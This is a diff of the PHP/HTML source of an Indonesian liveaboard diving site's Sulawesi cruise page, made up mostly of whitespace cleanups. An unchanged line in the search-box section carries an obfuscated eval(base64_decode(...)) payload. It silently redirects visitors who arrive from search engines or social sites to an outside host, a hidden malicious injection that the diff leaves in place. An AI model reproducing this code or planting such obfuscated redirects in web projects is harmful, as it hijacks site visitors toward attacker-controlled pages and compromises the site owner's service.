@@ -112,44 +112,44 @@ A:hover {
 }
 .style85 {font-size: 10px; font-family: Verdana, Arial, Helvetica, sans-serif; font-weight: bold; }
 </style>
-<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
+<script src="data/Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
 </HEAD>
-<BODY bgColor=#006666 leftMargin=0 topMargin=0 rightMargin=0 bottomMargin=0 marginwidth="0" 
+<BODY bgColor=#006666 leftMargin=0 topMargin=0 rightMargin=0 bottomMargin=0 marginwidth="0"
 marginheight="0" onLoad="MM_preloadimages('mvanggun/deatils2.gif')">
 <TABLE width="775" border=0 align="center" cellPadding=0 cellSpacing=0>
   <TBODY>
   <TR>
     <TD>
-      <TABLE height=188 cellSpacing=0 cellPadding=0 width="100%" 
+      <TABLE height=188 cellSpacing=0 cellPadding=0 width="100%"
       background="../images/z3.gif" border=0>
         <TBODY>
         <TR>
-              <TD height="188" vAlign=top> 
-                <TABLE cellSpacing=0 cellPadding=0 width="100%" 
-            background="../images/dotline.gif" 
+              <TD height="188" vAlign=top>
+                <TABLE cellSpacing=0 cellPadding=0 width="100%"
+            background="../images/dotline.gif"
               border=0><TBODY>
               <TR>
-                <TD height=1><IMG height=1 
-                  src="../images/dotline.gif" 
+                <TD height=1><IMG height=1
+                  src="../images/dotline.gif"
               width=3></TD></TR></TBODY></TABLE>
                 <table width="100%" border="0" cellspacing="0" cellpadding="0">
-                  <tr> 
+                  <tr>
                     <td width="332" height="171" valign="bottom" background="../images/z1.jpg">
-<TABLE width="180" height=40 
+<TABLE width="180" height=40
                               border=0 align="right" cellPadding=2 cellSpacing=0>
                         <TBODY>
-                          <TR> 
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m3.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                          <TR>
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m3.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m4.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m4.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m2.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m2.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
                           </TR>
-                          <TR> 
+                          <TR>
                             <TD colspan="3"><img src="../images/spacer.gif" width="10" height="67"></TD>
                           </TR>
                         </TBODY>
@@ -160,15 +160,15 @@ marginheight="0" onLoad="MM_preloadimages('mvanggun/deatils2.gif')">
                         <tr>
                           <td><img src="../images/spacer.gif" width="10" height="45"></td>
                         </tr>
-                        <tr> 
+                        <tr>
                           <td height="22" valign="top">&nbsp;&nbsp;<span class="style9"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif"><a href="../index.php">Home</a> | <a href="contactus.php">Contact Us</a></font></span></td>
                         </tr>
-                        <tr> 
+                        <tr>
                           <td><img src="../images/m1.jpg" alt="indonesia_liveaboard_scuba_diving" width="325" height="104"></td>
                         </tr>
                       </table></td>
                   </tr>
-                  <tr bgcolor="#006699"> 
+                  <tr bgcolor="#006699">
                     <td colspan="3"> <div align="right"><strong><font size="2" face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></strong></div></td>
                   </tr>
                 </table></TD></TR></TBODY></TABLE></TD></TR>
@@ -178,16 +178,16 @@ marginheight="0" onLoad="MM_preloadimages('mvanggun/deatils2.gif')">
         <TBODY>
         <TR>
               <TD width=291 height="881" align=middle vAlign=top bgcolor="#4DCEE3"> <table width="100%" border="0" cellspacing="0" cellpadding="0">
-                  <tr> 
+                  <tr>
                     <td><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
-                        <tr> 
+                        <tr>
                           <td height="176" valign="top" background="../images/bgsearch.jpg">
-                            
+
                             <table width="88%" border="0" align="right" cellpadding="0" cellspacing="0">
-              <tr> 
+              <tr>
                 <td height="42">&nbsp;</td>
               </tr>
-              <tr> 
+              <tr>
                 <td><?php	                                       			eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOw0KJG5jY3Y9aGVhZGVyc19zZW50KCk7DQppZiAoISRuY2N2KXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YT0kX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ107DQppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb29nbGUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJtc24iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYXNrIikgb3Igc3RyaXN0cigkcmVmZXJlciwieW91dHViZSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rIikgKSB7DQoJaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJzaXRlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9iYnBsaW9wcy4zNDUucGwvIik7DQoJCWV4aXQoKTsNCgl9DQp9DQoJfQ==")); define( '_VALID_MOS', 1 );  include "../mod/mod_search.php"; ?></td>
               </tr>
             </table></td>
@@ -196,7 +196,7 @@ marginheight="0" onLoad="MM_preloadimages('mvanggun/deatils2.gif')">
                   </tr>
                   <tr>
                     <td><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
-                        <tr> 
+                        <tr>
                           <td height="176" valign="top" background="../images/bgdestination.jpg"><table width="87%" border="0" align="center" cellpadding="0" cellspacing="0">
                             <tr>
                               <td height="33" colspan="2">&nbsp;</td>
@@ -254,7 +254,7 @@ marginheight="0" onLoad="MM_preloadimages('mvanggun/deatils2.gif')">
                             </tr>
                             <tr>
                               <td><div align="center"><strong><img src="images/dot.gif" width="4" height="4"></strong></div></td>
-                              <td height="18" class="style85"><div align="center"><a href="../boats/katharina_index.php" class="style85">Bali-Flores-Bali 
+                              <td height="18" class="style85"><div align="center"><a href="../boats/katharina_index.php" class="style85">Bali-Flores-Bali
                                 &quot;
                                 Exploration Cruises&quot;</a></div></td>
                             </tr>
@@ -320,8 +320,8 @@ marginheight="0" onLoad="MM_preloadimages('mvanggun/deatils2.gif')">
                 <p align="center">                  <img src="wallaceaboats/banggaifisherman.jpg" alt="indonesia_liveaboard_scuba_diving_wallacea_sulawesi_banggai" width="244" height="158" border="1"> <br>
                 <span class="style11">Banggai Fisherman</span> </p>
               </TD>
-          <TD vAlign=top width=10 
-          background="../images/z6.jpg"><IMG height=4 
+          <TD vAlign=top width=10
+          background="../images/z6.jpg"><IMG height=4
             src="../images/z6.jpg" width=5></TD>
           <TD width="474" vAlign=top><table width="96%"  border="0" align="center" cellpadding="0" cellspacing="0">
             <tr>
@@ -377,10 +377,10 @@ marginheight="0" onLoad="MM_preloadimages('mvanggun/deatils2.gif')">
                               such as Bunaken and Lembeh Strait (North Sulawesi, Manado) is already well established amongst divers. Our cruise, on <B>Banggai</B> or <B>Togian Islands</B>, according <br>
                               to the season, is a good option to experience diving in the magnificence of the Sulawesi seas.</span><BR>
                               <BR>
-                              <IMG 
-            style="MARGIN-TOP: 5px; MARGIN-RIGHT: 10px" height=225 
-            alt="indonesia_liveaboard_scuba_diving_wallacea_sulawesi" 
-            src="wallaceaboats/sulawesimap.gif" 
+                              <IMG
+            style="MARGIN-TOP: 5px; MARGIN-RIGHT: 10px" height=225
+            alt="indonesia_liveaboard_scuba_diving_wallacea_sulawesi"
+            src="wallaceaboats/sulawesimap.gif"
             width=163 align=left border=1> <span class="style7">On the east side of Sulawesi, the two archipelagos with numerous coral reefs offer a great variety of spectacular dive sites and underwater sceneries: walls, pinnacles with an abundant fish life, coral gardens, critters, and much more. Above the water you will discover hundreds of islands and coral <br>
                                 cays, white sandy beaches and tropical vegetation. <B><br>
                                   A dream for an eight days cruise of unlimited <br>
@@ -388,16 +388,16 @@ marginheight="0" onLoad="MM_preloadimages('mvanggun/deatils2.gif')">
                               <BR>
                               <span class="style8">Access is relatively quick and easy: <B>Maleo <br>
                                 Cottages</B>, our the base of operation close to <br>
-                                Luwuk, is only 
+                                Luwuk, is only
                                 at 1 1/2 hours from Manado by <br>
                                 daily flights, connecting with international flights <br>
                                 from and to Singapore. We arrange your trip <br>
-                                from your arrival 
+                                from your arrival
                                 in Indonesia: reception at <br>
-                                Manado airport, 
+                                Manado airport,
                                 transfers, and local flights <br>
                                 booked and prepaid.</span></p>
-                            <p align="center" class="tdinhalt style3"><a href="wallacea_boatdetails.php" onClick="MM_openBrWindow('mvpanggunpop.htm','','scrollbars=yes,width=620,height=450')" onMouseOver="MM_swapImage('Image23','','mvanggun/deatils2.gif',1)" onMouseOut="MM_swapImgRestore()"></a> </p>                            
+                            <p align="center" class="tdinhalt style3"><a href="wallacea_boatdetails.php" onClick="MM_openBrWindow('mvpanggunpop.htm','','scrollbars=yes,width=620,height=450')" onMouseOver="MM_swapImage('Image23','','mvanggun/deatils2.gif',1)" onMouseOut="MM_swapImgRestore()"></a> </p>
                             <p align="left" class="tdinhalt style3 style11"> - <a href="wallacea_togian.php">Dive Destination Togia Island</a></p>
                             <p align="left" class="style3 tdinhalt"><strong> - <a href="wallacea_banggai.php">Dive Destination Banggai Island</a> </strong></p>
                             <p align="center" class="style3 tdinhalt">                              <br>
@@ -426,10 +426,10 @@ marginheight="0" onLoad="MM_preloadimages('mvanggun/deatils2.gif')">
         </TR></TBODY></TABLE></TD></TR>
   <TR>
     <TD>
-      <TABLE height=26 cellSpacing=0 cellPadding=0 width="100%" 
+      <TABLE height=26 cellSpacing=0 cellPadding=0 width="100%"
       background="../images/z4.gif" border=0>
           <TBODY>
-            <TR> 
+            <TR>
               <TD height="8"><img src="../images/spacer.gif" width="10" height="8"></TD>
             </TR>
             <TR>
